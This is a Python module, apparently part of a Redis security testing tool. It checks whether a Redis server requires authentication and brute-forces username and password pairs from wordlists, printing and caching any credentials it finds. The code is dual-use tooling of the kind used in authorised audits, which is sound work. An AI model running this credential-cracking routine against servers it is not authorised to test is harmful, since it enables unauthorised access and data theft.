from .common import get_assume_defaults_value, get_cached_connection_options, \
        is_connection_working, get_db_connection, \
        cache_db_connection, get_cached_db_connection, \
        read_file, print_kv_pairs, \
        DEFAULT_USERS_WORDLIST, DEFAULT_PASSWD_WORDLIST

from .common import errormap


CONNECTION_OPTIONS = get_cached_connection_options()
WEAK_AUTH_CREDS = {}


AVAILABLE_ATTACKS = [
    "auth_existence_check",
    "crack_weak_auth"
]



def has_no_auth_help():
    return "\nReturns True if Redis server has no auth.\n" \
    "If authentication is enabled, False is returned.\n" \
    "If authentication is not enabled, True is returned.\n" \
    "In any other case, the program exits with the relevant\n" \
    "status code!\n\n" \
    "Currently, it's either Redis not running (ENO_CONN) or\n" \
    "the credentials are invalid/the user is disabled\n" \
    "(ENO_INVALID_CREDS | ENO_USER_DISABLED)\n"



def has_no_auth(redis):
    # Connect to redis client without auth
    # and report if it works or not

    conn_status = is_connection_working(redis)

    if conn_status == errormap.E_OK:
        # E_OK
        # Authentication is not required
        # Redis server is open to use...
        return True

    elif conn_status == errormap.ENO_CONN:
        # ENO_CONN
        print("Redis connection not working!\nAre you sure Redis is running on the specified port?\nIt is suggested to check for this before continuing with any other attacks.\nExiting...\n")
        exit(errormap.ENO_CONN)

    # Won't happen!
    elif conn_status == (errormap.ENO_INVALID_CREDS | errormap.ENO_USER_DISABLED):
        # ENO_INVALID_CREDS | ENO_USER_DISABLED
        print("Invalid credentials or the user is disabled!\nExiting...")
        exit(errormap.ENO_INVALID_CREDS | errormap.ENO_USER_DISABLED)

    else:
        # ENO_AUTH
        # Authentication is required!
        return False



def check_credentials_help():
    return "\nIt creates a connection to the Redis server with the\n" \
    "specified credentials and reports if the credentials\n" \
    "resulting in a successful connection or not!\n\n" \
    "If the connection works, True is returned and the connection\n" \
    "is cached for later use.\n\n" \
    "If the connection doesn't works, False is returned!\n\n" \
    "If any exception occurs (possible when the username/password)\n" \
    "contains some special characters, then also False is returned.\n" \
    "For such cases, a message is reported to the user so they can\n" \
    "try such credentials manually.\n"



def check_credentials(username = None, password = None):

    # Note: To optimize this, one might think to use
    # pipeline to send all the auth command at once, but
    # the issue is that everytime we wish to try a new
    # username-password pair, a new connection is required!

    # Based on our current experiences, it currently seems
    # unfeasible from the library. Maybe we need to do some
    # hacks to the redis-py module to get that to work!
    # Not completely sure...

    credentials = {
        "username": username,
        "password": password
    }

    global CONNECTION_OPTIONS
    CONNECTION_OPTIONS = { **CONNECTION_OPTIONS, **credentials }

    try:
        # Getting the client with proper authentication!
        redis = get_db_connection(CONNECTION_OPTIONS, auth = True)
    except ValueError as e:
        print("[Exception]: The username/password contains some special characters, please try this combination manually.")
        # TODO [low-priority]: Currently we don't see any good way to handle cases like the following:  
        # When a username/password contains special characters that are the part of a URL,
        # it results in parser failing to recognize the boundaries of the information,
        # resulting in failure!  
        # Example: 
        # 74k&^*nh#$
        # Hash is the special character here and that's causing the parsing confusion...
        print (f"username: '{username}'\npassword: '{password}'")
        # sleep(1)
        return False

    conn_status = is_connection_working(redis)

    # Cache connection iff conn_status == E_OK
    return conn_status == errormap.E_OK and cache_db_connection(redis)



def crack_auth_help():
    return "\nTries the provided username-password pairs\n" \
    "and stores the credentials which result in\n" \
    "a successful authentication!\n\n" \
    "Once the first set of credentials are\n" \
    "retrieved, user is prompted for continuation\n" \
    "if this attack."



def crack_auth(users_file, passwd_file):

    assume_defaults = get_assume_defaults_value()

    users_list = read_file(users_file).split("\n")
    passwd_list = read_file(passwd_file).split("\n")

    users_list.remove("default")
    users_list = ["default"] + users_list

    for user in users_list:
        for passwd in passwd_list:
            if check_credentials(user, passwd):
                print (f"[*] Found credentials:\n{user} => {passwd}")

                global WEAK_AUTH_CREDS
                WEAK_AUTH_CREDS[user] = passwd
                break
        else:
            continue

        proceed = "N"

        if not assume_defaults:
            proceed = input("\n[*] Do you wish to find more credentials? (default='no') [y/N] ") or proceed

        if proceed.lower() == "y":
            continue
        else:
            break



def auth_existence_check_help():
    return "\nChecks if the Redis server has authentication\nenabled or not.\n\n" \
    "A return value of True indicates authentication isn't\n" \
    "required, whereas False indicates it is required.\n"



def auth_existence_check():

    # Can pass connection options to this function
    redis = get_cached_db_connection()

    if has_no_auth(redis):
        # Has no authentication
        print ("\n[*] Open Redis server - no authentication required!\n")
        # Has no authentication
        return True

    else:
        print ("\n[-] Authentication is required!\n")
        # Has authentication
        return False



def crack_weak_auth_help():
    return "\nCracks the weak authentication and displays the\n" \
    "discovered credentials.\n\n" \
    "[NOTE] Kindly run this attack only if the Redis server is\n" \
    "reported to be auth protected. For that run the\n" \
    "`auth_existence_check` attack!\n"



def crack_weak_auth():

    if auth_existence_check():
        # If there is no authentication, then there
        # is no need to perform this attack!
        return

    assume_defaults = get_assume_defaults_value()

    users_wordlist = DEFAULT_USERS_WORDLIST
    passwd_wordlist = DEFAULT_PASSWD_WORDLIST

    if not assume_defaults:
        users_wordlist = input(f"\nProvide username list (default='{DEFAULT_USERS_WORDLIST}') ") or users_wordlist
        passwd_wordlist = input(f"Provide password list (default='{DEFAULT_PASSWD_WORDLIST}') ") or passwd_wordlist

    crack_auth(users_wordlist, passwd_wordlist)

    print ()
    print_kv_pairs(WEAK_AUTH_CREDS, label = "Discovered Credentials")
    print ()



def get_available_attacks():
    return AVAILABLE_ATTACKS



def perform_auth_attack(attack_name):
    if attack_name in AVAILABLE_ATTACKS:
        globals()[attack_name]()
    else:
        print ("\n[-] Invalid attack name.\n")



if __name__ == "__main__":
    if not auth_existence_check():
        # If there is authentication, then perform weak auth attack,
        # otherwise, there is no need for this attack!
        crack_weak_auth()